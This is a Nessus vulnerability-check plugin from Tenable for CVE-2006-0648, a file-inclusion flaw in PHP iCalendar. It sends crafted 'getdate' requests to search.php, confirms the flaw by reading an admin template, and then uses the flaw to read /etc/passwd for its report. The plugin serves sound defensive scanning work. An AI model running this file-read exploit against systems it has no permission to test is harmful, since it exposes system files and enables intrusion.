#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20867);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-0648");
  script_bugtraq_id(16557);
  script_xref(name:"OSVDB", value:"22973");
  script_xref(name:"OSVDB", value:"22974");

  script_name(english:"PHP iCalendar Multiple Script Remote File Inclusion");
  script_summary(english:"Checks for search.php getdate parameter remote file include vulnerability in PHP iCalendar");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to remote file inclusion attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running PHP iCalendar, a web-based iCal
file viewer / parser written in PHP. 

The installed version of PHP iCalendar fails to validate user input to
the 'getdate' parameter of the 'search.php' script as well as the
'file' parameter of 'template.php' script.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
leverage these flaws to view arbitrary files on the remote host and
execute arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://evuln.com/vulns/70/summary.html" );
 script_set_attribute(attribute:"see_also", value:"http://dimer.tamu.edu/phpicalendar.net/forums/viewtopic.php?p=1869#1869" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting or modify the code as
described in the advisory above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# A function to actually read a file.
function exploit(dir, file) {
  local_var r;
  global_var port;

  r = http_send_recv3(method: "GET", port: port,
    item:string(dir, "/search.php?","getdate=", file), 
    add_headers: make_array("Referer", SCRIPT_NAME));
  if (isnull(r)) return NULL;
  return r[2];
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/icalendar", "/phpicalendar", "/calendar", "/ical", "/cal", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = exploit(dir:dir, file:"./templates/default/admin.tpl");
  if (res == NULL) exit(0);

  # There's a problem if it looks like the admin template.
  if (egrep(pattern:"\{(HEADER|L_LOGOUT|L_ADMIN_HEADER)\}", string:res)) {
    # Try to exploit it to read /etc/passwd for the report.
    res2 = exploit(dir:dir, file:"/etc/passwd");
    if (res2) {
      contents = strstr(res2, "getdate=");
      if (contents) contents = contents - strstr(contents, '"><img src="templates/default/images/day_on.gif');
      if (contents) contents = contents - "getdate=";
    }

    if (isnull(contents)) security_warning(port);
    else {
      report = string(
        "\n",
        "Here is the /etc/passwd file that Nessus read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }

    exit(0);
  }
}
